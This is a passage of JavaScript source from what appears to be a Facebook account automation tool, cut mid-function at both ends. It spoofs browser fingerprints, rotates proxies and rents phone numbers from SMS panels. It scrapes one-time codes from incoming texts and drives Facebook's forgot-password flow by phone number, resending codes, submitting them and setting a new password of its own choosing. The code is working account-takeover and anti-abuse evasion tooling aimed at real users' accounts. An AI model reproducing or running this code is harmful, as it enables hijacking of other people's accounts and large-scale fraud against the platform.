      if (err && err.isProxyError && rawPx) badProxies.add(proxyHealthKey(rawPx));
      lastErr = err instanceof Error ? err.message : 'attempt error';
      log(`+${phone} [${effectiveIso}] try ${i + 1}/${tries} err: ${lastErr}`);
    }
  }

  return {
    ts: Math.floor(Date.now() / 1000),
    name: identity.name,
    number: phone,
    password: pw,
    uid: '',
    status: 'FAIL',
    confirmed: false,
    printer: lastPringer,
    cookies: {},
    err: lastErr,
    fmt: lastFmt,
    debugHtml: lastHtml,
    countryName: effectiveName,
    countryIso: effectiveIso,
    countryCc: effectiveCc,
  };
}

async function runDiagnoseFor(cfg, cookieRaw, proxyOverride) {
  const jar = parseCookieHeader(cookieRaw || normalizeBaseCookiesRaw(''));
  const trace = [];
  const px = proxyOverride !== undefined ? proxyOverride : cfg.proxy || null;
  const fp = buildFingerprint(cfg.cc);
  const fastCfg = { ...cfg, timeout: Math.min(Number(cfg.timeout || 18), 10) };

  const [tk, pr, gqlRes] = await Promise.all([
    harvestTokens(fastCfg, jar, trace, px, { fp }).catch(() => null),
    px ? testProxyTcp(px, true).catch((err) => ({ ok: false, error: err instanceof Error ? err.message : 'failed', exitIp: '', latencyMs: 0 })) : Promise.resolve(null),
    checkNumberGraphql('+8801700000001', {
      cc: cfg.cc,
      proxy: cfg.gql_via_direct !== false ? null : px,
      strictProxy: cfg.strict_proxy !== false,
      timeoutMs: 9000,
    }).catch((err) => ({ status: 'error', reason: err instanceof Error ? err.message : 'failed' })),
  ]);

  const proxyAlive = pr ? pr.ok : null;
  const proxyError = pr ? pr.error : undefined;
  const proxyExitIp = pr ? pr.exitIp || '' : '';
  const proxyLatency = pr ? pr.latencyMs || 0 : 0;
  const gqlOk = gqlRes.status === 'free' || gqlRes.status === 'taken';
  const gqlInfo = gqlRes.status === 'error'
    ? gqlRes.reason
    : `${gqlRes.status}${gqlRes.reason ? ` (${gqlRes.reason})` : ''}`;

  return {
    defaultProxy: px || '',
    proxyAlive,
    proxyError,
    proxyExitIp,
    proxyLatency,
    gqlOk,
    gqlInfo,
    pringerSample: fp.pringer,
    deviceSample: `${fp.brand} ${fp.model} (Chrome ${fp.chromeMajor})`,
    trace,
    tokenOk: Boolean(tk),
    src: tk?.src || '',
    etok: tk?.etok || '',
    dhash: tk?.dhash || '',
    lsd: tk?.lsd || '',
    cid: tk?.cid || '',
    actions: tk?.actions || [],
    fields: tk ? Object.keys(tk.inputs) : [],
    cookiesCount: Object.keys(jar).length,
  };
}

// ----------------------------------------------------------------------------
// 5b. VOLTX SMS API Client & OTP Extractor
// ----------------------------------------------------------------------------
function normalizeVoltxRid(raw) {
  const s = String(raw || '').trim();
  if (!s) return '';
  const stripped = s.replace(/X+$/i, '').trim();
  const digits = stripped.replace(/\D/g, '');
  return digits || stripped;
}

function maskSecretKey(k) {
  const s = String(k || '').trim();
  if (!s) return 'NOT SET';
  if (s.length <= 6) return `${s.slice(0, 2)}***`;
  return `${s.slice(0, 4)}••••${s.slice(-3)}`;
}

function extractFbOtpFromSms(msgText) {
  const raw = String(msgText || '').trim();
  if (!raw) return '';
  const patterns = [
    /\bFB[-:\s]*(\d{4,8})\b/i,
    /(?:confirmation|confirm|verification|security|login|facebook|meta)\s*(?:code|otp|pin)?(?:\s*is|\s*[:#-])+\s*(\d{4,8})\b/i,
    /(?:code|otp|pin)\s*(?:is|=|:|-)\s*(\d{4,8})\b/i,
    /\b(\d{5,8})\b/,
    /\b(\d{4})\b/,
  ];
  for (const re of patterns) {
    const m = raw.match(re);
    if (m && m[1]) return m[1];
  }
  return '';
}

function phoneDigitsMatch(a, b) {
  const da = String(a || '').replace(/\D/g, '');
  const db = String(b || '').replace(/\D/g, '');
  if (!da || !db) return false;
  if (da === db) return true;
  if (da.length >= 8 && db.length >= 8 && da.slice(-8) === db.slice(-8)) return true;
  return da.endsWith(db) || db.endsWith(da);
}

async function voltxRequest(baseUrl, apiKey, endpoint, method = 'GET', bodyObj = null) {
  const cleanBase = String(baseUrl || DEFAULT_VOLTX_BASE).replace(/\/+$/, '');
  const cleanKey = String(apiKey || '').trim();
  if (!cleanKey) {
    return { ok: false, code: 2941, status: 'missing_key', data: null, message: 'Voltx API key is not configured.' };
  }
  const url = `${cleanBase}${endpoint.startsWith('/') ? endpoint : `/${endpoint}`}`;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 14000);
  try {
    const res = await fetch(url, {
      method,
      headers: {
        mauthapi: cleanKey,
        Accept: 'application/json',
        ...(bodyObj ? { 'Content-Type': 'application/json' } : {}),
      },
      body: bodyObj ? JSON.stringify(bodyObj) : undefined,
      signal: controller.signal,
    });
    clearTimeout(timer);
    const text = await res.text();
    let json = null;
    try {
      json = JSON.parse(text);
    } catch {
      return { ok: false, code: res.status, status: 'bad_json', data: null, message: text.slice(0, 140) || `HTTP ${res.status}` };
    }
    const metaCode = Number(json?.meta?.code ?? res.status);
    const metaStatus = String(json?.meta?.status || '').toLowerCase();
    const ok = metaCode === 200 || metaStatus === 'ok';
    return {
      ok,
      code: metaCode,
      status: metaStatus,
      data: json?.data ?? null,
      message: String(json?.message || ''),
      rid: json?.rid || '',
    };
  } catch (err) {
    clearTimeout(timer);
    return {
      ok: false,
      code: 0,
      status: 'network_error',
      data: null,
      message: err instanceof Error ? err.message : 'Voltx request failed',
    };
  }
}

async function fetchVoltxLiveRanges(baseUrl, apiKey) {
  const [liveRes, consoleRes] = await Promise.all([
    voltxRequest(baseUrl, apiKey, '/liveaccess', 'GET'),
    voltxRequest(baseUrl, apiKey, '/console', 'GET'),
  ]);
  if (!liveRes.ok && !consoleRes.ok) {
    return {
      ok: false,
      error: liveRes.message || consoleRes.message || 'Failed to load Voltx ranges',
      code: liveRes.code || consoleRes.code,
      ranges: [],
    };
  }

  const rangeMap = new Map();
  const ensureEntry = (rawRange) => {
    const label = String(rawRange || '').trim();
    const rid = normalizeVoltxRid(label);
    if (!rid) return null;
    let entry = rangeMap.get(rid);
    if (!entry) {
      const det = detectCountryFromNumber(`+${rid}`, '');
      entry = {
        rid,
        label: label || rid,
        country: det?.name || 'Unknown',
        iso: det?.iso || '??',
        sids: new Set(),
        isFb: false,
        hits: 0,
        lastAt: 0,
        sampleMsg: '',
      };
      rangeMap.set(rid, entry);
    }
    return entry;
  };

  const services = Array.isArray(liveRes.data?.services) ? liveRes.data.services : [];
  for (const svc of services) {
    const sid = String(svc?.sid || 'Unknown').trim();
    const lastAt = Number(svc?.last_at || 0);
    const isFbSid = /facebook|\bfb\b|meta/i.test(sid);
    for (const r of Array.isArray(svc?.ranges) ? svc.ranges : []) {
      const entry = ensureEntry(r);
      if (!entry) continue;
      if (sid) entry.sids.add(sid);
      if (isFbSid) entry.isFb = true;
      if (lastAt > entry.lastAt) entry.lastAt = lastAt;
      entry.hits += 1;
    }
  }

  const hits = Array.isArray(consoleRes.data?.hits) ? consoleRes.data.hits : [];
  for (const h of hits) {
    const sid = String(h?.sid || '').trim();
    const msg = String(h?.message || '').trim();
    const t = Number(h?.time || 0);
    const entry = ensureEntry(h?.range);
    if (!entry) continue;
    if (sid) entry.sids.add(sid);
    if (/facebook|\bfb\b|meta/i.test(sid) || /\bFB-\d+|facebook/i.test(msg)) {
      entry.isFb = true;
    }
    if (t >= entry.lastAt) {
      entry.lastAt = t;
      if (msg) entry.sampleMsg = msg.slice(0, 60);
    }
    entry.hits += 1;
  }

  const ranges = Array.from(rangeMap.values())
    .map((e) => ({ ...e, sidsList: Array.from(e.sids) }))
    .sort((a, b) => {
      if (a.isFb !== b.isFb) return a.isFb ? -1 : 1;
      if (b.hits !== a.hits) return b.hits - a.hits;
      return b.lastAt - a.lastAt;
    });

  return { ok: true, ranges, servicesCount: services.length, hitsCount: hits.length };
}

async function voltxGetNum(baseUrl, apiKey, rid) {
  const cleanRid = normalizeVoltxRid(rid);
  const res = await voltxRequest(baseUrl, apiKey, '/getnum', 'POST', { rid: cleanRid });
  if (!res.ok || !res.data) {
    return {
      ok: false,
      outOfStock: res.code === 2946 || res.status === 'not_found',
      code: res.code,
      message: res.message || 'Number allocation failed',
    };
  }
  const d = res.data;
  const noPlus = String(d.no_plus_number || d.full_number || '').replace(/\D/g, '');
  return {
    ok: Boolean(noPlus),
    fullNumber: d.full_number || (noPlus ? `+${noPlus}` : ''),
    noPlusNumber: noPlus,
    nationalNumber: String(d.national_number || ''),
    country: String(d.country || ''),
    operator: String(d.operator || ''),
  };
}

async function voltxGetSuccessOtps(baseUrl, apiKey) {
  const res = await voltxRequest(baseUrl, apiKey, '/success-otp', 'GET');
  if (!res.ok) {
    return { ok: false, code: res.code, message: res.message || 'Failed to fetch OTPs', otps: [] };
  }
  const otps = Array.isArray(res.data?.otps) ? res.data.otps : [];
  return { ok: true, otps };
}

// ----------------------------------------------------------------------------
// 5c. LAMIX SMS API v1 Client & Facebook Forgot-Password Recovery (PC Clone)
// ----------------------------------------------------------------------------
const LAMIX_BASE_URL = (process.env.LAMIX_BASE_URL || 'https://panel.lamix.org/api/v1').replace(/\/+$/, '');

async function lamixRequest(token, endpoint, params = null) {
  const cleanTok = String(token || '').trim();
  if (!cleanTok) return { ok: false, error: 'Lamix token is not configured.' };
  let url = `${LAMIX_BASE_URL}${endpoint.startsWith('/') ? endpoint : `/${endpoint}`}`;
  if (params && typeof params === 'object') {
    const qs = new URLSearchParams();
    for (const [k, v] of Object.entries(params)) {
      if (v !== undefined && v !== null && v !== '') qs.set(k, String(v));
    }
    const qStr = qs.toString();
    if (qStr) url += `?${qStr}`;
  }
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 14000);
  try {
    const res = await fetch(url, {
      method: 'GET',
      headers: {
        Authorization: `Bearer ${cleanTok}`,
        Accept: 'application/json',
        'User-Agent': 'Mozilla/5.0',
      },
      signal: controller.signal,
    });
    clearTimeout(timer);
    const text = await res.text();
    let data = {};
    try {
      data = text ? JSON.parse(text) : {};
    } catch {
      return { ok: false, status: res.status, error: text.slice(0, 120) || `HTTP ${res.status}` };
    }
    if (!res.ok) {
      return { ok: false, status: res.status, error: data?.message || data?.error || `HTTP ${res.status}` };
    }
    return { ok: true, status: res.status, data };
  } catch (err) {
    clearTimeout(timer);
    return { ok: false, status: 0, error: err instanceof Error ? err.message : 'Lamix request failed' };
  }
}

async function fetchLamixMessages(token, limit = 60) {
  const res = await lamixRequest(token, '/messages', { limit });
  if (!res.ok) return { ok: false, error: res.error, messages: [] };
  const d = res.data;
  const list = Array.isArray(d)
    ? d
    : Array.isArray(d?.records)
    ? d.records
    : Array.isArray(d?.messages)
    ? d.messages
    : Array.isArray(d?.data)
    ? d.data
    : [];
  return { ok: true, messages: list };
}

function getLamixMsgFields(row) {
  if (!row || typeof row !== 'object') return { id: '', number: '', message: '', ts: 0 };
  const number = String(row.number || row.phone || row.msisdn || row.to || row.recipient || '').replace(/\D/g, '');
  const message = String(row.message || row.sms || row.body || row.text || row.content || '').trim();
  const id = String(row.id || row._id || row.message_id || `${number}_${row.createdAt || row.time || row.timestamp || message.slice(0, 16)}`);
  const rawTs = row.createdAt || row.created_at || row.timestamp || row.time || 0;
  let ts = 0;
  if (typeof rawTs === 'number') ts = rawTs > 1e12 ? rawTs : rawTs * 1000;
  else if (rawTs) {
    const parsed = Date.parse(String(rawTs));
    if (!Number.isNaN(parsed)) ts = parsed;
  }
  return { id, number, message, ts };
}

function pickSmsRecoverChoice(html) {
  const form = readForm(html, 'otp');
  const fields = Object.fromEntries(Object.entries(form.inputs || {}).map(([k, v]) => [k, v[1]]));
  const radios = [];
  for (const tag of (html || '').match(/<input\b[^>]*type=["']radio["'][^>]*>/gi) || []) {
    const nM = tag.match(/name=["']([^"']+)["']/i);
    const vM = tag.match(/value=["']([^"']*)["']/i);
    if (nM && vM) radios.push({ name: decodeHtmlAttrs(nM[1]), value: decodeHtmlAttrs(vM[1]) });
  }
  const smsRadio = radios.find((r) => /sms|mobile|phone|text/i.test(r.value) && !/whatsapp|call|voice/i.test(r.value));
  if (smsRadio) fields[smsRadio.name] = smsRadio.value;
  return { action: form.action || '', fields, hasSmsRadio: Boolean(smsRadio), radios };
}

async function triggerForgotPasswordOtp(phone, cfg, proxy, opts = {}) {
  const timeoutMs = Math.max(12000, ((cfg.timeout || 22) + 4) * 1000);
  const strictProxy = cfg.strict_proxy !== false;
  const resendTarget = Math.max(1, Math.min(10, Number(opts.resends ?? cfg.pc_otp_resends ?? 3)));
  const fp = buildFingerprint(opts.cc || cfg.cc);
  const jar = {};
  if (cfg.fresh_id !== false) {
    jar.wd = `${fp.sw}x${fp.sh}`;
    jar.m_pixel_ratio = String(fp.dpr);
  }
  let px = proxy || cfg.proxy || null;
  const mobileUa = fp.ua || LITE_UA;
  const trace = [];

  const isDesktopUrl = (u) => {
    try {
      const h = new URL(u).hostname.toLowerCase();
      return h === 'www.facebook.com' || h === 'web.facebook.com' || h === 'facebook.com';
    } catch {
      return false;
    }
  };

  const uaForUrl = (u) => (isDesktopUrl(u) ? DESKTOP_UA : mobileUa);

  const headersForUrl = (u, extra = {}) => {
    if (isDesktopUrl(u)) {
      return {
        'User-Agent': DESKTOP_UA,
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': fp.headers['Accept-Language'] || 'en-US,en;q=0.9',
        'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document',
        'upgrade-insecure-requests': '1',
        ...extra,
      };
    }
    return { ...fp.headers, ...extra };
  };

  const safeFetch = async (url, fOpts = {}) => {
    const reqUa = fOpts.ua || uaForUrl(url);
    try {
      return await fetchWithJar(url, jar, {
        ...fOpts,
        timeoutMs,
        proxy: px,
        strictProxy,
        ua: reqUa,
        shouldAbort: opts.shouldAbort,
      });
    } catch (err) {
      if (err && err.isProxyError && /407/.test(err.message || '') && opts.rawProxy && px !== opts.rawProxy) {
        dynamicProxyTagBlacklist.add(proxyHealthKey(opts.rawProxy));
        px = opts.rawProxy;
        return await fetchWithJar(url, jar, {
          ...fOpts,
          timeoutMs,
          proxy: px,
          strictProxy,
          ua: reqUa,
          shouldAbort: opts.shouldAbort,
        });
      }
      throw err;
    }
  };

  const hasIdentifySearchForm = (html, url) => {
    const f = readForm(html, 'reg');
    const keys = Object.keys(f.inputs || {});
    if (!keys.includes('email')) return false;
    const isPasswordLoginForm = keys.includes('pass') && !/\/login\/identify|\/recover|\/hacked/i.test(url || '');
    return !isPasswordLoginForm;
  };

  const isCodeInputPage = (html, url) =>
    OTP_FIELDS.some((k) => new RegExp(`name=["']${k}["']`, 'i').test(html || '')) || /\/recover\/code/i.test(url || '');

  const userEntries = normalizePcRecoveryUrls(opts.recoveryUrls || cfg.pc_recovery_urls, { fallbackToDefaults: true });
  const fallbackEntries = [
    'https://m.facebook.com/login/identify/?ctx=recover&ars=facebook_login',
    'https://mbasic.facebook.com/login/identify/?ctx=recover',
  ];
  const candidateEntries = Array.from(new Set([...userEntries, ...fallbackEntries]));

  let curUrl = '';
  let curHtml = '';
  let usedEntryUrl = '';
  let activeUa = mobileUa;
  let searchSettled = false;

  for (const entryUrl of candidateEntries) {
    if (opts.shouldAbort && opts.shouldAbort()) return { ok: false, aborted: true };
    let eUrl = entryUrl;
    let eHtml = '';
    const entryOrigin = new URL(entryUrl).origin;

    try {
      const r0 = await safeFetch(entryUrl, {
        headers: headersForUrl(entryUrl, { Referer: `${entryOrigin}/` }),
      });
      if (r0.status >= 400 || (r0.text || '').length < 180) {
        trace.push(`entry(${new URL(entryUrl).hostname}:${r0.status})`);
        continue;
      }
      eUrl = r0.url || entryUrl;
      eHtml = r0.text || '';
      trace.push(`entry(${new URL(entryUrl).hostname}${new URL(entryUrl).pathname.slice(0, 16)}:${r0.status})`);
    } catch (err) {
      if (err && err.isProxyError) throw err;
      trace.push(`entry-err`);
      continue;
    }

    // If landed on /login/ or /hacked/ landing page instead of identify search, follow forgot/identify/hacked link
    if (!hasIdentifySearchForm(eHtml, eUrl)) {
      const linkMatch =
        eHtml.match(/href=["']([^"']*\/login\/identify[^"']*)["']/i) ||
        eHtml.match(/href=["']([^"']*\/recover\/initiate[^"']*)["']/i) ||
        eHtml.match(/href=["']([^"']*\/hacked\/(?:support|compromised|recover)[^"']*)["']/i);
      const nextIdentifyUrl = linkMatch?.[1]
        ? new URL(decodeHtmlAttrs(linkMatch[1]), eUrl).toString()
        : `${new URL(eUrl).origin}/login/identify/?ctx=recover&ars=facebook_login`;

      try {
        const rNext = await safeFetch(nextIdentifyUrl, {
          headers: headersForUrl(nextIdentifyUrl, { Referer: eUrl }),
        });
        if (rNext.status < 400 && (rNext.text || '').length > 180) {
          eUrl = rNext.url || nextIdentifyUrl;
          eHtml = rNext.text || '';
          trace.push(`hop-id(${rNext.status})`);
        }
      } catch (err) {
        if (err && err.isProxyError) throw err;
      }

      // If /hacked/ returned a "My account is compromised" form without an email field, submit or hop to identify
      if (!hasIdentifySearchForm(eHtml, eUrl) && /\/hacked/i.test(eUrl)) {
        const hForm = readForm(eHtml, 'reg');
        if (hForm.action && /\/hacked|\/login\/identify|\/recover/i.test(hForm.action)) {
          try {
            const hAct = new URL(hForm.action, eUrl).toString();
            const hFields = Object.fromEntries(Object.entries(hForm.inputs || {}).map(([k, v]) => [k, v[1]]));
            const rHack = await safeFetch(hAct, {
              method: 'POST',
              body: new URLSearchParams(hFields).toString(),
              headers: headersForUrl(hAct, {
                Referer: eUrl,
                Origin: new URL(hAct).origin,
                'Content-Type': 'application/x-www-form-urlencoded',
              }),
            });
            if (rHack.status < 400 && (rHack.text || '').length > 180) {
              eUrl = rHack.url || hAct;
              eHtml = rHack.text || '';
              trace.push(`hack-post(${rHack.status})`);
            }
          } catch (err) {
            if (err && err.isProxyError) throw err;
          }
        }
      }
    }

    if (!hasIdentifySearchForm(eHtml, eUrl)) {
      trace.push(`no-id-form(${new URL(eUrl).hostname})`);
      continue;
    }

    // Step 1: Submit phone search on the resolved identify/hacked form
    const idForm = readForm(eHtml, 'reg');
    const idFields = Object.fromEntries(Object.entries(idForm.inputs || {}).map(([k, v]) => [k, v[1]]));
    const lsd = idFields.lsd || tok(eHtml, 'lsd');
    if (lsd) {
      idFields.lsd = lsd;
      idFields.jazoest = idFields.jazoest || tok(eHtml, 'jazoest') || jazoest(lsd);
    }
    idFields.email = `+${phone}`;
    if (!('did_submit' in idFields)) idFields.did_submit = '1';

    const idAct = idForm.action
      ? new URL(idForm.action, eUrl).toString()
      : `${new URL(eUrl).origin}/login/identify/?ctx=recover`;
    let rSearch;
    try {
      rSearch = await safeFetch(idAct, {
        method: 'POST',
        body: new URLSearchParams(idFields).toString(),
        headers: headersForUrl(idAct, {
          Referer: eUrl,
          Origin: new URL(idAct).origin,
          'Content-Type': 'application/x-www-form-urlencoded',
        }),
      });
    } catch (err) {
      if (err && err.isProxyError) throw err;
      trace.push('search-err');
      continue;
    }

    curUrl = rSearch.url || idAct;
    curHtml = rSearch.text || '';
    usedEntryUrl = entryUrl;
    activeUa = uaForUrl(curUrl);
    trace.push(`search ${rSearch.status} -> ${curUrl.split('?')[0].slice(-26)}`);

    const sig1 = extractFbResponseSignals(curHtml);
    const vis1 = `${sig1.visibleText} ${sig1.errTexts.join(' ')}`.toLowerCase();
    if (GQL_NO_ACCOUNT_PATTERNS.some((p) => vis1.includes(p)) || vis1.includes('no search results')) {
      return { ok: false, notFound: true, usedEntryUrl, err: 'Facebook reported no account for this number', trace };
    }

    // If multiple accounts listed ("This is my account" link or /recover/initiate/ link), follow initiate/select link
    if (!/\/recover\/(?:initiate|code|password)/i.test(curUrl)) {
      const recLink = (sig1.decodedHtml || curHtml).match(/href=["']([^"']*\/recover\/(?:initiate|select)[^"']*)["']/i);
      if (recLink && recLink[1]) {
        const nextU = new URL(decodeHtmlAttrs(recLink[1]), curUrl).toString();
        const rSel = await safeFetch(nextU, { headers: headersForUrl(nextU, { Referer: curUrl }) });
        curUrl = rSel.url || nextU;
        curHtml = rSel.text || curHtml;
        activeUa = uaForUrl(curUrl);
        trace.push(`sel -> ${rSel.status}`);
      }
    }

    // Verify we landed on a recovery/OTP surface (or mobile form) before locking onto this entry URL
    const pickCheck = pickSmsRecoverChoice(curHtml);
    if (/\/recover\//i.test(curUrl) || isCodeInputPage(curHtml, curUrl) || Boolean(pickCheck.action)) {
      searchSettled = true;
      break;
    }

    // If desktop www.facebook.com served a JS-only Comet page after search, try next entry URL (e.g. m.facebook.com)
    trace.push(`non-ssr(${new URL(curUrl).hostname})`);
  }

  if (!searchSettled || !curHtml) {
    return { ok: false, err: 'Could not open Facebook recovery OTP page via configured links', usedEntryUrl, trace };
  }

  let otpsSent = 0;
  let lastMethod = '';
  let rateLimited = false;

  const itemStub = {
    status: 'CONFIRM',
    flow: 'recovery',
    phone,
    name: opts.nameHint || `FB User +${phone.slice(-4)}`,
    pass: opts.newPass || cfg.password || '',
    uid: extractUidFromHtml(curHtml, curUrl) || '',
    cookies: orderCookies(jar),
    confirm_url: curUrl,
    proxy: px || '',
    ua: activeUa,
    iso: opts.iso || '',
    country: opts.country || '',
    usedEntryUrl,
    resendCount: 0,
    _lastConfirmHtml: curHtml,
  };

  const syncStubState = () => {
    const uFound = extractUidFromHtml(curHtml, curUrl);
    if (uFound && !itemStub.uid) itemStub.uid = uFound;
    itemStub.cookies = orderCookies(jar);
    itemStub.confirm_url = curUrl;
    itemStub.ua = uaForUrl(curUrl);
    itemStub.resendCount = otpsSent;
    itemStub._lastConfirmHtml = curHtml;
    const pf = readForm(curHtml, 'otp');
    if (pf.action) {
      itemStub.action = pf.action;
      itemStub.fields = Object.fromEntries(Object.entries(pf.inputs || {}).map(([k, v]) => [k, v[1]]));
    }
  };

  const sendSmsInitiate = async () => {
    const pick = pickSmsRecoverChoice(curHtml);
    if (!pick.action) return false;
    const postUrl = new URL(pick.action, curUrl).toString();
    const rInit = await safeFetch(postUrl, {
      method: 'POST',
      body: new URLSearchParams(pick.fields).toString(),
      headers: headersForUrl(postUrl, {
        Referer: curUrl,
        Origin: new URL(postUrl).origin,
        'Content-Type': 'application/x-www-form-urlencoded',
      }),
    });
    curUrl = rInit.url || postUrl;
    curHtml = rInit.text || '';
    const s = extractFbResponseSignals(curHtml);
    const low = `${s.visibleText} ${s.errTexts.join(' ')}`.toLowerCase();
    if (/too many|try again later|rate limit|wait a few minutes/i.test(low)) {
      rateLimited = true;
      return false;
    }
    return isCodeInputPage(curHtml, curUrl) || /recover\/code|sent.*code|enter.*code/i.test(`${curUrl} ${low}`);
  };

  if (isCodeInputPage(curHtml, curUrl)) {
    otpsSent = 1;
    lastMethod = 'recover/code(initial)';
    trace.push('otp-1(auto)');
  } else {
    const sent1 = await sendSmsInitiate().catch(() => false);
    if (sent1) {
      otpsSent = 1;
      lastMethod = 'recover/initiate(SMS)';
      trace.push('otp-1(sms)');
    } else if (/\/recover\//i.test(curUrl)) {
      otpsSent = 1;
      lastMethod = 'recover/probe';
      trace.push('otp-1(probe)');
    }
  }

  syncStubState();

  // Check Lamix/Voltx immediately after Round 1 if a hook is attached
  if (otpsSent > 0 && typeof opts.onAfterOtpSent === 'function') {
    const check1 = await opts.onAfterOtpSent({
      round: 1,
      totalRounds: resendTarget,
      otpsSent,
      usedEntryUrl,
      item: { ...itemStub, cookies: { ...itemStub.cookies } },
    });
    if (check1 && check1.stop) {
      delete itemStub._lastConfirmHtml;
      return {
        ok: true,
        earlyMatched: true,
        loginResult: check1.loginResult || null,
        otpsSent,
        rateLimited,
        via: lastMethod || 'recover',
        usedEntryUrl,
        item: itemStub,
        trace,
      };
    }
  }

  // Step 3: Repeat / Resend Forgot OTP up to resendTarget (1..10x), checking Lamix/Voltx after EACH resend
  for (let round = otpsSent + 1; round <= resendTarget; round++) {
    if (rateLimited || (opts.shouldAbort && opts.shouldAbort())) break;
    const okWait = await sleepAbort(900 + Math.floor(Math.random() * 600), opts.shouldAbort);
    if (!okWait) break;

    let stepOk = false;
    const rStep = await performOtpResendOnce(itemStub, { ...cfg, timeout: Math.max(15, Number(cfg.timeout || 22)) }, '', {
      html: curHtml,
      shouldAbort: opts.shouldAbort,
    });
    if (rStep.ok) {
      otpsSent += 1;
      lastMethod = rStep.via || 'recover/resend';
      curUrl = rStep.confirmUrl || itemStub.confirm_url;
      curHtml = itemStub._lastConfirmHtml || curHtml;
      Object.assign(jar, itemStub.cookies || {});
      syncStubState();
      stepOk = true;
      trace.push(`otp-${round}(${lastMethod.slice(0, 14)})`);
    } else if (rStep.rateLimited) {
      rateLimited = true;
      trace.push(`otp-${round}(RL)`);
      break;
    } else {
      // Fallback: re-navigate to /recover/initiate/ on the current origin (or m.facebook.com) and re-submit SMS
      for (const baseOrigin of Array.from(new Set([new URL(curUrl).origin, 'https://m.facebook.com']))) {
        if (opts.shouldAbort && opts.shouldAbort()) break;
        try {
          const initUrl = `${baseOrigin}/recover/initiate/?ars=facebook_login`;
          const rBack = await safeFetch(initUrl, { headers: headersForUrl(initUrl, { Referer: curUrl }) });
          if (rBack.status < 400 && (rBack.text || '').length > 200) {
            curUrl = rBack.url || initUrl;
            curHtml = rBack.text || '';
            const reSent = await sendSmsInitiate();
            if (reSent) {
              otpsSent += 1;
              lastMethod = 'recover/re-initiate';
              syncStubState();
              stepOk = true;
              trace.push(`otp-${round}(re-init)`);
              break;
            }
          }
        } catch {
          // try next fallback origin
        }
      }
      if (!stepOk) {
        trace.push(`otp-${round}(stop:${(rStep.reason || 'no-link').slice(0, 18)})`);
        break;
      }
    }

    if (stepOk && typeof opts.onAfterOtpSent === 'function') {
      const checkN = await opts.onAfterOtpSent({
        round,
        totalRounds: resendTarget,
        otpsSent,
        usedEntryUrl,
        item: { ...itemStub, cookies: { ...itemStub.cookies } },
      });
      if (checkN && checkN.stop) {
        delete itemStub._lastConfirmHtml;
        return {
          ok: true,
          earlyMatched: true,
          loginResult: checkN.loginResult || null,
          otpsSent,
          rateLimited,
          via: lastMethod || 'recover',
          usedEntryUrl,
          item: itemStub,
          trace,
        };
      }
    }
  }

  delete itemStub._lastConfirmHtml;
  itemStub.resendCount = otpsSent;
  itemStub.cookies = orderCookies(jar);
  itemStub.confirm_url = curUrl;
  return {
    ok: otpsSent > 0 || Boolean(itemStub.action),
    otpsSent,
    rateLimited,
    via: lastMethod || 'recover',
    usedEntryUrl,
    item: itemStub,
    trace,
  };
}

async function submitRecoveryOtpAndLogin(item, code, newPwInput, cfg) {
  const jar = { ...(item.cookies || {}) };
  let px = (item.proxy || cfg.proxy || '').trim() || null;
  const strictProxy = cfg.strict_proxy !== false;
  const ua = item.ua || LITE_UA;
  const newPass = String(newPwInput || item.pass || cfg.password || `FbClone@${Math.floor(1000 + Math.random() * 8999)}`).trim();
  const timeoutMs = Math.max(18000, ((cfg.timeout || 25) + 5) * 1000);

  let confirmUrl = item.confirm_url || 'https://m.facebook.com/recover/code/';
  let act = item.action || '';
  let flds = { ...(item.fields || {}) };

  const safeFetch = async (url, fOpts = {}) => {
    return await fetchWithJar(url, jar, { ...fOpts, timeoutMs, proxy: px, strictProxy, ua });
  };

  if (!act) {
    try {
      const rGet = await safeFetch(confirmUrl);
      confirmUrl = rGet.url || confirmUrl;
      const pf = readForm(rGet.text || '', 'otp');
      act = pf.action;
      flds = Object.fromEntries(Object.entries(pf.inputs || {}).map(([k, v]) => [k, v[1]]));
    } catch (err) {
      return { status: 'FAIL', err: err instanceof Error ? err.message : 'Network error' };
    }
  }
  if (!act) {
    return { status: 'FAIL', err: 'No recovery OTP form available' };
  }

  const otpField = OTP_FIELDS.find((k) => k in flds) || 'n';
  flds[otpField] = String(code || '').trim();
  const postAct = new URL(act, confirmUrl).toString();
  let rCode;
  try {
    rCode = await safeFetch(postAct, {
      method: 'POST',
      body: new URLSearchParams(flds).toString(),
      headers: {
        Referer: confirmUrl,
        Origin: new URL(postAct).origin,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
  } catch (err) {
    return { status: 'FAIL', err: err instanceof Error ? err.message : 'OTP submit error' };
  }

  let curUrl = rCode.url || postAct;
  let body = rCode.text || '';
  const visLow = extractVisibleText(body).toLowerCase();

  if (WRONG_CODE_WORDS.some((w) => visLow.includes(w))) {
    return { status: 'WRONG' };
  }

  // Handle "Choose a New Password" page (/recover/password/)
  if (/password_new|new_pass|\/recover\/password/i.test(`${curUrl}\n${body}`)) {
    const pwForm = readForm(body, 'reg');
    const pwFields = Object.fromEntries(Object.entries(pwForm.inputs || {}).map(([k, v]) => [k, v[1]]));
    const pwKey = Object.keys(pwFields).find((k) => /password_new|new_pass|pass/i.test(k)) || 'password_new';
    pwFields[pwKey] = newPass;
    if ('password_confirm' in pwFields) pwFields.password_confirm = newPass;
    const pwAct = new URL(pwForm.action || curUrl, curUrl).toString();
    try {
      const rPw = await safeFetch(pwAct, {
        method: 'POST',
        body: new URLSearchParams(pwFields).toString(),
        headers: {
          Referer: curUrl,
          Origin: new URL(pwAct).origin,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
      curUrl = rPw.url || pwAct;
      body = rPw.text || '';
    } catch (err) {
      return { status: 'FAIL', err: err instanceof Error ? err.message : 'Password reset step failed' };
    }
  }

  // Handle optional "Stay logged in / Log out of other devices" prompt
  if (/logout_other|keep_sessions|session_invalidate/i.test(body)) {
    try {
      const sForm = readForm(body, 'reg');
      if (sForm.action) {
        const sFields = Object.fromEntries(Object.entries(sForm.inputs || {}).map(([k, v]) => [k, v[1]]));
        const sAct = new URL(sForm.action, curUrl).toString();
        const rStay = await safeFetch(sAct, {
          method: 'POST',
